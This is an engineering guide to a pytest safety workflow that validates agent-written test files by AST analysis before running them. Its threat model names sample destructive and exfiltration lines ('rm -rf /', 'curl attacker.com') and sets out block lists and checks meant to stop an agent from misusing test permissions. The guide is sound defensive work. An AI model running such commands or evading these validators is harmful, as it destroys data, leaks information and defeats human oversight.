# Safe Pytest Execution Workflow -- Engineering Guide

**Date:** 2026-04-01
**Status:** Post-implementation
**Spec:** `.tmp-skill-output/PYTEST_SAFE_WORKFLOW_SPEC.md`
**Design:** `.tmp-skill-output/PYTEST_SAFE_WORKFLOW_DESIGN.md`
**Sketch:** `docs/superpowers/specs/2026-04-01-pytest-safe-workflow-sketch.md`

---

## Table of Contents

1. [Overview](#1-overview)
2. [Architecture](#2-architecture)
3. [Component Reference](#3-component-reference)
4. [Configuration](#4-configuration)
5. [Data Formats](#5-data-formats)
6. [Agent Skill Usage](#6-agent-skill-usage)
7. [Extension Guide](#7-extension-guide)
8. [Troubleshooting](#8-troubleshooting)

---

## 1. Overview

### 1.1 What the System Does

The Safe Pytest Execution Workflow provides a controlled, validated test execution pipeline for the RAG project. It replaces unrestricted `Bash(pytest *)` permission with a single entry point (`scripts/run-tests.sh`) that:

1. **Validates** test files for dangerous patterns via AST analysis before any code is executed.
2. **Runs** pytest with structured JSON output consumable by agents.
3. **Produces** machine-readable results in `.tmp-test-results/` for programmatic consumption.
4. **Supports** an automated fix-rerun loop with infinite-loop prevention.

### 1.2 Why It Exists

Claude Code agents have the ability to write and execute test files. Without guardrails, an agent could write a "test" file containing `subprocess.run("rm -rf /", shell=True)`, `os.system("curl attacker.com")`, or other dangerous operations that execute during pytest collection, fixture setup, or test function invocation. The agent exploits unrestricted pytest permission to achieve effects beyond its intended scope.

This system enforces a pre-execution safety boundary: test code is analyzed as text (via `ast.parse()`) before it is ever imported or run. The validator and test executor are separate processes -- the validator exits completely before pytest is spawned.

### 1.3 Who Uses It

The primary consumers are **Claude Code agents** and the **test-runner skill** that orchestrates them. Humans may invoke the system directly for debugging or auditing, but the design is agent-first: output is structured JSON, the fix loop is designed for automated consumption, and the skill interface provides the abstraction layer.

### 1.4 Threat Model Summary

| Vector | Example | Mitigation |
|--------|---------|------------|
| Module-level code execution | `import subprocess; subprocess.run("rm -rf /")` | AST detects both the import and the call |
| Fixture-injected danger | conftest.py fixture that calls `os.system()` | Validator scans all conftest.py files in scope |
| Dynamic code construction | `exec("sub" + "process.run(...)")` | AST blocks `exec()` calls regardless of arguments |
| Test function body | `def test_exploit(): os.system("curl ...")` | Full AST walk covers all function bodies |
| Malicious group config | Agent creates `scripts/test-groups/evil.conf` | Runner verifies `.conf` file is git-tracked |

**Out-of-scope threats:** OS-level privilege escalation, third-party pytest plugins, Docker container escapes. These are managed by OS-level permissions and dependency pinning.

---

## 2. Architecture

### 2.1 Component Diagram

```
+========================================================+
|  Claude Code Agent (or autonomous orchestrator)        |
|                                                        |
|  Invokes skill, reads JSON results from                |
|  .tmp-test-results/ after execution completes.         |
+========================================================+
         |                              ^
         | Bash(scripts/run-tests.sh    | reads JSON files from
         |   --group ingest)            | .tmp-test-results/
         v                              |
+========================================================+
|  SKILL.md (test-runner skill)                          |
|  File: .tmp-skill-output/test-runner-skill/SKILL.md    |
|                                                        |
|  Maps scope + scope_type to CLI flags.                 |
|  Instructs agent to parse output JSON files.           |
|  Defines the fix loop protocol.                        |
+========================================================+
         |
         | shell invocation
         v
+========================================================+
|  scripts/run-tests.sh  (Process 1: Orchestrator)       |
|                                                        |
|  - Parses CLI arguments                                |
|  - Validates group name / path                         |
|  - Sources group .conf file                            |
|  - Collects test files via `find`                      |
|  - Invokes check_pytest.py (subprocess)                |
|  - Invokes pytest (subprocess, under `timeout`)        |
|  - Writes meta.json                                    |
|  - Manages .tmp-test-results/ lifecycle                |
+========================================================+
         |                           |
         | python scripts/           | timeout <N> uv run pytest
         | check_pytest.py           | --json-report ...
         | <files> --json            |
         | [--allow ...] [--strict]  |
         v                           v
+========================+   +==============================+
| scripts/check_pytest.py|   | uv run pytest                |
| (Process 2: Validator) |   | (Process 3: Test Execution)  |
|                        |   |                              |
| Pure Python, stdlib    |   | Runs in separate process     |
| only. NEVER imports    |   | ONLY after validator passes  |
| test code.             |   | (exit 0).                    |
|                        |   |                              |
| Input:  file paths     |   | Input:  scope args, flags    |
| Output: JSON to stdout |   | Output: report.json, stdout  |
| Exit:   0 / 1 / 2     |   | Exit:   0 / 1 / 2 / 124     |
+========================+   +==============================+
         |                           |
         v                           v
+========================================================+
|  .tmp-test-results/  (ephemeral output directory)      |
|                                                        |
|  validation.json  -- always written (even on pass)     |
|  report.json      -- only if pytest ran                |
|  run.log          -- only if pytest ran                |
|  meta.json        -- always written                    |
+========================================================+

+========================================================+
|  scripts/test-groups/*.conf  (group configuration)     |
|                                                        |
|  Shell-sourceable key=value files.                     |
|  Must be git-tracked. Sourced by run-tests.sh.         |
|  8 files: ingest, retrieval, guardrails, observability,|
|           server, import-check, root, all              |
+========================================================+
```

### 2.2 Process Isolation Model

The core security property is **process isolation between validation and execution**. Three separate processes participate in a test run:

| Process | Role | Language | Lifecycle |
|---------|------|----------|-----------|
| `run-tests.sh` | Orchestrator | Bash | Lives for the full run; spawns the other two processes sequentially |
| `check_pytest.py` | Validator | Python (stdlib only) | Spawned by orchestrator; runs `ast.parse()` on all files; exits completely before pytest starts |
| `uv run pytest` | Executor | Python | Spawned by orchestrator **only if** the validator exited with code 0; runs under the shell `timeout` command |

The invariant: Process 2 terminates before Process 3 is spawned. There is no overlap.

### 2.3 Data Flow

```
Step 1: Agent invokes skill
  Agent -> SKILL.md -> Bash("scripts/run-tests.sh --group ingest")

Step 2: Runner parses args, loads config
  run-tests.sh sources scripts/test-groups/ingest.conf
  -> TEST_PATHS="tests/ingest/", TIMEOUT=30, RUN_TIMEOUT=300

Step 3: Runner collects files via filesystem traversal
  find tests/ingest/ -name "test_*.py" -o -name "*_test.py"
  Walk upward to tests/ root collecting conftest.py files

Step 4: Runner invokes validator (SEPARATE PROCESS)
  python scripts/check_pytest.py <file-list> --json [--allow ...] [--strict]
  Stdout captured to .tmp-test-results/validation.json
  Exit 0 = safe, Exit 1 = blocked, Exit 2 = validator error

Step 5: If validator exit == 0, runner invokes pytest (SEPARATE PROCESS)
  timeout 300 uv run pytest tests/ingest/ \
    --json-report --json-report-file=.tmp-test-results/report.json \
    --timeout=30 --tb=short
  Stdout/stderr captured to .tmp-test-results/run.log

Step 6: Runner writes meta.json and exits with pytest's exit code

Step 7: Agent reads .tmp-test-results/report.json (or validation.json if blocked)
```

---

## 3. Component Reference

### 3.1 AST Safety Validator (`scripts/check_pytest.py`)

**File:** `scripts/check_pytest.py` (~1,287 lines)
**Language:** Python (stdlib only -- no external dependencies)
**Entry point:** `main()` function; invoked as `python scripts/check_pytest.py <paths> [flags]`

#### 3.1.1 Purpose

Performs static analysis on Python test files using `ast.parse()` to detect dangerous patterns. The validator **never imports or executes** the code it analyzes. It is the security boundary of the system.

#### 3.1.2 Interface

**CLI usage:**

```bash
python scripts/check_pytest.py <path-or-files...> [--json] [--strict] [--allow PATTERNS]
```

| Flag | Default | Description |
|------|---------|-------------|
| `paths` (positional) | Required | One or more file paths or directory paths |
| `--json` | true | Output JSON to stdout (kept for explicitness) |
| `--strict` | false | Upgrade WARN-severity violations to BLOCK |
| `--allow PATTERNS` | (none) | Comma-separated module names whose imports are allowed |

**Exit codes:**

| Code | Meaning |
|------|---------|
| 0 | All files pass validation (no BLOCK violations) |
| 1 | At least one BLOCK violation detected |
| 2 | Validator internal error (parse failure, I/O error, bad arguments) |

**Output:** JSON to stdout conforming to the `validation.json` schema (see Section 5.1). Human-readable summary to stderr.

#### 3.1.3 Key Implementation Details

**Exported symbols:**

- `SafetyValidator` -- Main class, performs all analysis
- `Violation` -- Dataclass for a single violation
- `ConftestExemption` -- Dataclass for an exempted pattern in conftest.py
- `OverrideApplied` -- Dataclass for a per-group override
- `ValidationResult` -- Aggregated result across all files
- `discover_files()` -- File discovery from paths/directories
- `main()` -- CLI entry point

**Alias tracking:**

The validator builds a per-file alias table from `ast.Import` and `ast.ImportFrom` nodes. This allows detection of aliased dangerous patterns:

```python
import subprocess as sp
sp.run("ls")  # Resolved to subprocess.run -> BLOCK
```

The alias table maps local names to fully-qualified originals:

| Statement | Alias Table Entry |
|-----------|------------------|
| `import subprocess as sp` | `sp -> subprocess` |
| `from os import system` | `system -> os.system` |
| `from os import system as s` | `s -> os.system` |
| `import os` | `os -> os` |

The table is scoped per file (not cross-file). A fresh table is built for each file processed.

**Parent map:**

The validator builds a `dict[int, ast.AST]` mapping `id(child) -> parent_node` for the entire tree before traversal. This enables:

- Determining whether an import is at module level or inside a function (network library detection depends on this).
- Finding the enclosing function's parameter names (for `tmp_path` heuristic).

**Detection categories:**

| Category | Constants | Severity | Overridable |
|----------|-----------|----------|-------------|
| 1: Dangerous calls | `DANGEROUS_CALLS` dict | BLOCK | Never |
| 2: Dangerous imports | `DANGEROUS_IMPORTS` set | BLOCK | Yes, via `--allow` |
| 3: Filesystem writes | `FILESYSTEM_DANGER_CALLS` dict + `open()` special case | BLOCK (or WARN for `write_text`/`write_bytes`) | No |
| 4: Process/signal | `PROCESS_SIGNAL_CALLS` dict | BLOCK | Never |
| 5: Database access | `DATABASE_BLOCK_CALLS` dict + `sqlite3.connect` special case | BLOCK or WARN | No |
| 6: Network libraries | `NETWORK_LIBRARIES` set | BLOCK (module-level) / WARN (function-level) | Yes, via `--allow` |

**Category 1 -- Dangerous calls (never overridable):**

These are function call patterns that the validator blocks unconditionally. Even if `--allow subprocess` is passed, `subprocess.run()` calls are still blocked. The `--allow` flag only affects import-level detection (Category 2).

Blocked calls include: `subprocess.run/call/Popen/check_output/check_call`, `os.system/popen/exec*`, `eval`, `exec`, `compile`, `__import__`.

**Category 3 -- Filesystem writes (tmp_path heuristic):**

The validator uses a best-effort heuristic to detect whether a file write is derived from `tmp_path`:

1. Check if the enclosing function has a `tmp_path` or `tmp_path_factory` parameter.
2. Walk the path argument's AST subtree for a `Name(id='tmp_path')` node.
3. Check for string literals starting with `/tmp`.

This covers patterns like `open(tmp_path / "file.txt", "w")` and `(tmp_path / "out.txt").write_text("data")`. Patterns the heuristic cannot verify get WARN severity (upgraded to BLOCK under `--strict`).

**Category 6 -- Network libraries (location-dependent severity):**

Import detection severity depends on where the import appears:

- Module-level import (not inside any function): severity = BLOCK
- Function-level import (inside `ast.FunctionDef` or `ast.AsyncFunctionDef`): severity = WARN

This reflects the pragmatic observation that function-level imports in test files typically accompany mock setup.

#### 3.1.4 Safety Invariants

1. The validator only uses `ast.parse()` -- it never calls `import`, `exec`, or `eval` on target code.
2. Category 1 dangerous calls are never overridable, regardless of `--allow` flags or group config.
3. The alias table ensures that `import subprocess as sp; sp.run(...)` is caught.
4. conftest.py exemptions are limited to `sys.modules`, `importlib.util`, `types.ModuleType`, and `*.loader.exec_module()`. All other dangerous patterns are enforced in conftest files.
5. Parse errors are reported as violations with severity `error` (not silently ignored).

---

### 3.2 Test Runner Orchestrator (`scripts/run-tests.sh`)

**File:** `scripts/run-tests.sh` (~455 lines)
**Language:** Bash
**Entry point:** `main "$@"` at the end of the script

#### 3.2.1 Purpose

Thin orchestration layer that validates arguments, loads group configuration, collects test files, invokes the safety validator, and (if validation passes) runs pytest. Manages the `.tmp-test-results/` output directory lifecycle.

#### 3.2.2 Interface

```bash
scripts/run-tests.sh [OPTIONS]

Options:
  --group NAME        Run a predefined test group (ingest, retrieval, etc.)
  --path PATH         Run tests at a specific path (file or directory)
  --marker EXPR       Pytest marker expression (-m flag)
  --keyword EXPR      Pytest keyword expression (-k flag)
  --timeout SECS      Per-test timeout in seconds (default: 30)
  --run-timeout SECS  Total run timeout in seconds (default: 300)
  --strict            Treat WARN violations as BLOCK (default: false)
  --dry-run           Run validation only, no pytest execution
  --verbose           Show pytest output in real-time (in addition to capturing)
```

**Scope rules:**

- Exactly one of `--group` or `--path` must be provided (they define the file scope).
- `--marker` and `--keyword` are optional filter flags that may be combined with `--group` or `--path`.
- If neither `--group` nor `--path` is given, exit code 2.
- If both are given, exit code 2.

**Exit codes:**

| Scenario | Exit Code |
|----------|-----------|
| Validation failure (BLOCK violation) | 1 |
| Validation error (validator internal error) | 2 |
| Argument parsing error | 2 |
| Pytest passes | 0 |
| Pytest fails (test failures) | 1 (pytest's code) |
| Pytest error (collection error) | 2 (pytest's code) |
| Total run timeout exceeded | 124 |

#### 3.2.3 Key Implementation Details

**Group name validation:**

The `--group NAME` argument must match `^[a-z0-9-]+$`. This rejects path separators, dots, uppercase, spaces, and special characters. After the regex check, the runner verifies that `scripts/test-groups/<NAME>.conf` exists and is tracked by git (`git ls-files --error-unmatch`).

**Path validation:**

The `--path PATH` argument is resolved to an absolute path via `realpath` and verified to be under `<project_root>/tests/`. Paths with `..` components that escape `tests/` are rejected.

**File collection:**

Test files are collected via filesystem operations (`find` for directories, `ls` for glob patterns, direct path for files). The runner does NOT use `pytest --collect-only` because that would import test modules, executing module-level code before validation.

Conftest files are discovered by walking upward from each test file's directory to the `tests/` root. A deduplication pass ensures each conftest is only validated once.

**Validation overrides parsing:**

The `VALIDATION_OVERRIDES` value from group config (e.g., `"subprocess:allow"`) is parsed into a comma-separated list of patterns passed to `check_pytest.py` via `--allow`. Only the `allow` action is supported; unknown actions cause exit code 2.

**Timeout handling:**

Two layers of timeout enforcement:

1. **Per-test timeout:** Passed to pytest via `pytest-timeout` plugin (`--timeout=N`). Each test exceeding N seconds is terminated and marked as an error. If `pytest-timeout` is not installed, the runner prints a warning and proceeds without per-test enforcement.

2. **Total run timeout:** The entire pytest invocation is wrapped with `timeout --signal=TERM --kill-after=10 <N>`. If pytest exceeds N seconds total, it receives SIGTERM. After a 10-second grace period, SIGKILL is sent. Exit code 124 indicates a timeout kill.

**Output directory lifecycle:**

`.tmp-test-results/` is deleted (`rm -rf`) and recreated (`mkdir -p`) at the start of every run. It is ephemeral and gitignored. Files written:

- `validation.json` -- always (even on successful validation)
- `report.json` -- only if pytest ran (produced by `pytest-json-report`)
- `run.log` -- only if pytest ran (captured stdout/stderr)
- `meta.json` -- always (run metadata)

#### 3.2.4 Safety Invariants

1. The runner never exposes a `--no-validate` flag. Agents cannot bypass validation.
2. Group configs must be git-tracked (prevents agent-created malicious configs).
3. The validator exits before pytest is spawned (process isolation).
4. All paths are validated to stay under `tests/` (no path traversal).

---

### 3.3 Group Configuration Files (`scripts/test-groups/*.conf`)

**Directory:** `scripts/test-groups/`
**Format:** Shell-sourceable key=value files
**Count:** 8 files

#### 3.3.1 Purpose

Declarative configuration for predefined test domains. Each file defines the test paths, timeout values, validation overrides, and extra pytest flags for one domain. The runner loads them via `source scripts/test-groups/<NAME>.conf`.

#### 3.3.2 File Inventory

| File | Group Name | TEST_PATHS | TIMEOUT | RUN_TIMEOUT | VALIDATION_OVERRIDES |
|------|-----------|------------|---------|-------------|---------------------|
| `ingest.conf` | ingest | `tests/ingest/` | 30 | 300 | (none) |
| `retrieval.conf` | retrieval | `tests/retrieval/` | 15 | 120 | (none) |
| `guardrails.conf` | guardrails | `tests/guardrails/` | 30 | 180 | (none) |
| `observability.conf` | observability | `tests/observability/` | 15 | 120 | (none) |
| `server.conf` | server | `tests/server/` | 15 | 120 | (none) |
| `import-check.conf` | import-check | `tests/import_check/` | 15 | 120 | `subprocess:allow` |
| `root.conf` | root | `tests/test_*.py` | 30 | 300 | (none) |
| `all.conf` | all | `tests/` | 30 | 600 | `subprocess:allow` |

Notes:
- `import-check` requires the `subprocess:allow` override because `tests/import_check/test_integration.py` uses `subprocess.run()` for git repo initialization and `test_inventory.py` imports `subprocess` for constructing `CompletedProcess` mock return values.
- `all` inherits the union of overrides needed by any individual group.
- `root` uses a glob pattern (`tests/test_*.py`) because root-level tests are individual files, not a subdirectory.

---

### 3.4 Agent Skill (`SKILL.md`)

**File:** `.tmp-skill-output/test-runner-skill/SKILL.md`
**Type:** Claude Code skill definition (Markdown with YAML front matter)

#### 3.4.1 Purpose

Provides the agent-facing interface to the test runner. Maps high-level inputs (scope, scope_type, marker, keyword, strict, timeout) to shell invocations. Defines the output format the agent should expect. Contains the fix loop protocol with termination conditions.

#### 3.4.2 Key Responsibilities

- Translate `scope_type="group"` + `scope="ingest"` into `scripts/run-tests.sh --group ingest`.
- Translate `scope_type="path"` + `scope="tests/ingest/test_foo.py"` into `scripts/run-tests.sh --path tests/ingest/test_foo.py`.
- Append optional flags (`--marker`, `--keyword`, `--strict`, `--timeout`).
- Instruct the agent to read `.tmp-test-results/report.json` (or `validation.json` on block).
- Define the fix loop protocol (max 3 iterations, same-failure detection, monotonic progress check).

---

### 3.5 Unit Tests (`tests/scripts/test_check_pytest.py`)

**File:** `tests/scripts/test_check_pytest.py`
**Framework:** pytest with `tmp_path` fixture

#### 3.5.1 Purpose

Unit tests for the AST safety validator. Tests cover all six detection categories, conftest exemptions, group overrides, alias tracking, strict mode, parse error handling, and file discovery.

#### 3.5.2 Test Structure

| Test Class | FR Coverage | Tests |
|------------|------------|-------|
| `TestDangerousCalls` | FR-102 | Parametrized tests for each dangerous call pattern; location variants (module-level, function, class method, nested function) |
| `TestDangerousImports` | FR-103 | Import statement detection; `from X import Y` detection; mock.patch string arguments are NOT flagged |
| `TestFilesystemWrites` | FR-104 | `open()` with write mode; `tmp_path` heuristic; `shutil.rmtree`; `os.remove`; `Path.write_text` |
| (Additional classes) | FR-105 through FR-114 | Process/signal, database, network, conftest exemptions, alias tracking, strict mode, overrides |

Tests create temporary Python files via `tmp_path`, write test code as strings, then run `SafetyValidator().validate_file()` and assert on the resulting violations.

---

## 4. Configuration

### 4.1 Group Config File Format

Each group config file is a shell-sourceable key=value file. All values are quoted strings:

```bash
# scripts/test-groups/<group-name>.conf
# <Human-readable description comment>
TEST_PATHS="tests/ingest/"
MARKERS=""
TIMEOUT=30
RUN_TIMEOUT=300
VALIDATION_OVERRIDES=""
EXTRA_FLAGS=""
DESCRIPTION="Ingestion pipeline tests (document processing, embedding, orchestration)"
```

#### Required Keys

| Key | Type | Description | Validation |
|-----|------|-------------|------------|
| `TEST_PATHS` | String | Space-separated paths relative to project root | Must be non-empty |
| `MARKERS` | String | Pytest marker expression (`-m` flag) | Empty string if none |
| `TIMEOUT` | Positive integer | Per-test timeout in seconds | Runner validates as integer after sourcing |
| `RUN_TIMEOUT` | Positive integer | Total run timeout in seconds | Runner validates as integer after sourcing |
| `EXTRA_FLAGS` | String | Additional pytest flags | Empty string if none |
| `DESCRIPTION` | String | Human-readable description | Informational only |

#### Optional Keys

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `VALIDATION_OVERRIDES` | String | (empty) | Comma-separated `pattern:allow` pairs |

### 4.2 How to Add a New Test Group

1. Create `scripts/test-groups/<group-name>.conf` with all required keys.
2. The group name must match `^[a-z0-9-]+$` (lowercase alphanumeric and hyphens only).
3. Commit the file to git (the runner verifies `.conf` files are git-tracked).
4. If the group needs validation overrides, add `VALIDATION_OVERRIDES="pattern:allow"`.
5. If the `all` group needs to include the new overrides, update `all.conf` accordingly.
6. Test the new group: `scripts/run-tests.sh --group <group-name> --dry-run`

Example -- adding an `integration` group:

```bash
# scripts/test-groups/integration.conf
# Integration tests requiring network access
TEST_PATHS="tests/integration/"
MARKERS=""
TIMEOUT=60
RUN_TIMEOUT=600
VALIDATION_OVERRIDES="requests:allow,httpx:allow"
EXTRA_FLAGS=""
DESCRIPTION="Integration tests with real network access"
```

### 4.3 Validation Overrides Mechanism

Overrides allow specific groups to use imports that are globally blocked. The mechanism:

1. Group config sets `VALIDATION_OVERRIDES="subprocess:allow"`.
2. The runner parses this into `--allow subprocess` passed to `check_pytest.py`.
3. The validator skips import-level BLOCK for the named module.
4. The override is logged in `validation.json` under `overrides_applied`.

**Constraints:**

- Only import-level blocks (Category 2 and Category 6) can be overridden.
- Dangerous call patterns (Category 1) are NEVER overridable. `--allow subprocess` allows `import subprocess` but does NOT allow `subprocess.run()`.
- Only the `allow` action is supported. Any other action causes the runner to exit with code 2.
- Multiple overrides are comma-separated: `VALIDATION_OVERRIDES="subprocess:allow,socket:allow"`.

### 4.4 pyproject.toml Dependencies

The runner requires two pytest plugins in the dev dependency group:

| Plugin | Purpose | Behavior if Missing |
|--------|---------|-------------------|
| `pytest-json-report` | Structured JSON output to `report.json` | Runner exits with code 2 (hard requirement) |
| `pytest-timeout` | Per-test timeout enforcement | Runner prints a warning and proceeds without per-test timeout (soft requirement) |

---

## 5. Data Formats

### 5.1 validation.json Schema

Written to `.tmp-test-results/validation.json` by the runner (captured from `check_pytest.py` stdout). Always written, even when validation passes.

```json
{
  "status": "blocked | passed | error",
  "timestamp": "2026-04-01T12:00:00Z",
  "files_scanned": 35,
  "files_passed": 33,
  "files_blocked": 2,
  "violations": [
    {
      "file": "tests/ingest/test_orchestrator.py",
      "line": 42,
      "category": "dangerous_call | dangerous_import | filesystem_write | process_signal | database_access | network_library | parse_error",
      "pattern": "subprocess.run",
      "severity": "block | warn | error",
      "message": "Call to subprocess.run detected at line 42"
    }
  ],
  "conftest_exemptions": [
    {
      "file": "tests/conftest.py",
      "line": 9,
      "pattern": "sys.modules",
      "reason": "conftest exemption: sys.modules manipulation for test bootstrap"
    }
  ],
  "overrides_applied": [
    {
      "pattern": "subprocess",
      "action": "allow",
      "source": "group_config"
    }
  ]
}
```

**Field reference:**

| Field | Type | Description |
|-------|------|-------------|
| `status` | string | `"passed"` (no BLOCK violations), `"blocked"` (at least one BLOCK), `"error"` (validator internal error) |
| `timestamp` | string | ISO 8601 UTC timestamp of the validation run |
| `files_scanned` | int | Total files analyzed (test files + conftest files) |
| `files_passed` | int | Files with no BLOCK violations |
| `files_blocked` | int | Files with at least one BLOCK violation |
| `violations` | array | List of violation objects (may include BLOCK, WARN, and ERROR entries) |
| `conftest_exemptions` | array | Patterns exempted because they appeared in conftest.py files |
| `overrides_applied` | array | Import-level overrides applied via `--allow` flag |

**Violation categories:**

| Category | Meaning |
|----------|---------|
| `dangerous_call` | Function call to subprocess, os.system, eval, exec, etc. |
| `dangerous_import` | Import of subprocess, socket, ctypes, etc. |
| `filesystem_write` | File write operation outside tmp_path/tmp |
| `process_signal` | os.kill, signal.signal, sys.exit, os.fork, etc. |
| `database_access` | Database connection call |
| `network_library` | Import of requests, httpx, aiohttp, urllib.request |
| `parse_error` | Python syntax error or validator internal error |

### 5.2 report.json Schema (pytest-json-report)

Written to `.tmp-test-results/report.json` by the `pytest-json-report` plugin. Only exists if pytest actually ran (validation passed).

The full schema is defined by the [pytest-json-report plugin](https://github.com/numirias/pytest-json-report). Key fields relevant to agent consumption:

```json
{
  "created": 1711929600.0,
  "duration": 12.34,
  "exitcode": 0,
  "root": "/home/user/RAG",
  "environment": { ... },
  "summary": {
    "passed": 10,
    "failed": 2,
    "error": 0,
    "skipped": 1,
    "total": 13
  },
  "tests": [
    {
      "nodeid": "tests/ingest/test_orchestrator.py::test_run_pipeline",
      "outcome": "passed",
      "duration": 0.45,
      "setup": { "outcome": "passed", "duration": 0.01 },
      "call": { "outcome": "passed", "duration": 0.44 },
      "teardown": { "outcome": "passed", "duration": 0.001 }
    },
    {
      "nodeid": "tests/ingest/test_chunker.py::test_chunk_empty",
      "outcome": "failed",
      "duration": 0.12,
      "call": {
        "outcome": "failed",
        "duration": 0.10,
        "longrepr": "... full traceback ..."
      }
    }
  ]
}
```

The agent reads `summary` for pass/fail counts and iterates `tests` to extract failure details (particularly `longrepr` for the fix loop).

### 5.3 meta.json Schema

Written to `.tmp-test-results/meta.json` by the runner. Always written.

```json
{
  "timestamp": "2026-04-01T12:00:00Z",
  "scope": "tests/ingest/",
  "scope_type": "group",
  "group": "ingest",
  "duration_seconds": 45.2,
  "exit_code": 0,
  "validation_status": "passed",
  "pytest_status": "passed | failed | error | not_run",
  "command": "uv run pytest tests/ingest/ --json-report ...",
  "agent": null,
  "iteration": 1,
  "max_iterations": 3
}
```

| Field | Type | Description |
|-------|------|-------------|
| `timestamp` | string | ISO 8601 UTC timestamp of run start |
| `scope` | string | Resolved test paths |
| `scope_type` | string | `"group"` or `"path"` |
| `group` | string or null | Group name (null if scope_type is "path") |
| `duration_seconds` | int | Wall clock duration of the entire run |
| `exit_code` | int | Final exit code of the runner |
| `validation_status` | string | `"passed"`, `"blocked"`, `"error"`, or `"unknown"` |
| `pytest_status` | string | `"passed"`, `"failed"`, `"error"`, or `"not_run"` |
| `command` | string or null | The full pytest command that was executed (null if pytest did not run) |
| `agent` | null | Reserved for future agent identification |
| `iteration` | int | Current fix loop iteration (always 1 for non-loop runs) |
| `max_iterations` | int | Maximum fix loop iterations (always 3) |

### 5.4 run.log Format

Written to `.tmp-test-results/run.log`. Raw captured stdout and stderr from the pytest invocation. This is unstructured text -- the pytest terminal output including progress indicators, pass/fail markers, and tracebacks.

The agent reads `run.log` only as a fallback when `report.json` is unavailable (e.g., when pytest crashes before producing JSON output, or when the total run timeout is exceeded).

---

## 6. Agent Skill Usage

### 6.1 Scope-to-Invocation Mapping

The skill maps its inputs to runner invocations as follows:

| scope_type | scope | Generated Command |
|------------|-------|-------------------|
| `"group"` | `"ingest"` | `scripts/run-tests.sh --group ingest` |
| `"group"` | `"all"` | `scripts/run-tests.sh --group all` |
| `"path"` | `"tests/ingest/test_orchestrator.py"` | `scripts/run-tests.sh --path tests/ingest/test_orchestrator.py` |
| `"path"` | `"tests/retrieval/"` | `scripts/run-tests.sh --path tests/retrieval/` |

Optional flags are appended when their corresponding input parameters are provided:

| Input Parameter | Appended Flag |
|-----------------|---------------|
| `marker="not slow"` | `--marker "not slow"` |
| `keyword="test_query"` | `--keyword "test_query"` |
| `strict=true` | `--strict` |
| `timeout=60` | `--timeout 60` |

### 6.2 Fix Loop Protocol

The fix loop is orchestrated by the calling agent, not by the skill itself. The protocol:

```
1. Invoke test-runner: scripts/run-tests.sh --group <scope>
2. If status == "pass": done
3. If status == "blocked": report validation failure, stop (never try to fix safety violations)
4. If status == "fail":
   a. Initialize: iteration_count=0, max_iterations=3, previous_failures={}
   b. For each failure in report.json:
      - Read test file at file:line
      - Infer source file from imports
      - Determine: test bug or source bug?
      - Fix the appropriate file (must be git-tracked, edit only)
   c. Re-invoke test-runner with same scope
   d. Evaluate termination checks (see below)
   e. Repeat until terminated
5. Report final status
```

**Termination checks (evaluated in this order after each iteration):**

1. **All tests pass:** `current_failures` is empty. Report success with `termination_reason: all_passed`.
2. **Same-failure detection:** `current_failures == previous_failures` (exact set equality on `(test_name, message)` tuples). Stop with `termination_reason: same_failure`.
3. **Monotonic progress:** If failure count has not decreased and the stall budget is exhausted, stop with `termination_reason: stalled`. One stall-budget iteration is allowed when the failure set changes but the count stays the same.
4. **Max iterations:** `iteration_count >= 3`. Stop with `termination_reason: max_iterations`.

**Fixer file scope constraints:**

- MAY edit both test files and source files.
- File MUST be tracked by git (`git ls-files --error-unmatch <path>` must succeed).
- MUST NOT create new files.
- MUST NOT delete files.

### 6.3 Reading and Interpreting Results

**After a successful run (exit code 0):**

Read `.tmp-test-results/report.json`. The `summary` object contains `passed`, `failed`, `error`, `skipped`, `total`. All tests passed.

**After test failures (exit code 1 with report.json present):**

Read `.tmp-test-results/report.json`. Filter the `tests` array for entries where `outcome == "failed"`. Each failed test has a `call.longrepr` field with the full traceback. This is the primary input for the fix loop.

**After validation block (exit code 1 without report.json):**

Read `.tmp-test-results/validation.json`. The `violations` array lists each blocked file with file, line, category, pattern, and message. The agent should report these to the user -- do NOT attempt to "fix" safety violations.

**After timeout (exit code 124):**

Read `.tmp-test-results/run.log` for partial output. The `meta.json` will show `pytest_status: "error"`. The agent should report the timeout and suggest increasing `--run-timeout` or investigating slow tests.

**After runner error (exit code 2):**

Check stderr output from the Bash invocation. Common causes: invalid group name, path outside `tests/`, missing `pytest-json-report` plugin, malformed group config.

---

## 7. Extension Guide

### 7.1 How to Add a New Detection Category

Detection categories are defined as module-level constants in `scripts/check_pytest.py`.

**Step 1:** Define the category constant. Choose the appropriate data structure:

- For function calls to block: add to an existing `dict[str, str]` (e.g., `DANGEROUS_CALLS`) or create a new one.
- For module imports to block: add to an existing `set[str]` (e.g., `DANGEROUS_IMPORTS`) or create a new one.

```python
# Example: new Category 7 -- Environment manipulation
ENVIRONMENT_DANGER_CALLS: dict[str, str] = {
    "os.environ.__setitem__": "env_manipulation",
    "os.putenv": "env_manipulation",
}
```

**Step 2:** Add detection logic in `SafetyValidator.validate_file()`. The main loop walks all `ast.Call` nodes. Add a new check block after the existing categories:

```python
# Category 7: Environment manipulation
if resolved in ENVIRONMENT_DANGER_CALLS:
    violations.append(Violation(
        file=file_path,
        line=node.lineno,
        category=ENVIRONMENT_DANGER_CALLS[resolved],
        pattern=resolved,
        severity="block",
        message=f"Environment manipulation: {resolved}()",
    ))
    continue
```

**Step 3:** Add unit tests in `tests/scripts/test_check_pytest.py`. Follow the parametrized pattern used by `TestDangerousCalls`.

**Step 4:** Update this engineering guide's detection categories table (Section 3.1.3).

### 7.2 How to Add a New Test Group

See Section 4.2 above. Summary:

1. Create `scripts/test-groups/<name>.conf` with all required keys.
2. Name must match `^[a-z0-9-]+$`.
3. Git-commit the file.
4. Update `all.conf` if the new group's overrides need to be included in the full suite.
5. Dry-run test: `scripts/run-tests.sh --group <name> --dry-run`.
6. Update the SKILL.md "Available Groups" table.

### 7.3 How to Add conftest Exemptions

conftest.py exemptions allow specific patterns that would normally be blocked to pass validation when they appear in files named `conftest.py`.

**For import exemptions:**

Add the module name to `CONFTEST_EXEMPT_IMPORTS` in `check_pytest.py`:

```python
CONFTEST_EXEMPT_IMPORTS: set[str] = {
    "importlib.util",
    "importlib",
    "new_exempt_module",  # Add here
}
```

**For call exemptions:**

Add the fully-qualified call name to `CONFTEST_EXEMPT_CALLS`:

```python
CONFTEST_EXEMPT_CALLS: set[str] = {
    "importlib.util.spec_from_file_location",
    "importlib.util.module_from_spec",
    "types.ModuleType",
    "new_exempt_module.new_function",  # Add here
}
```

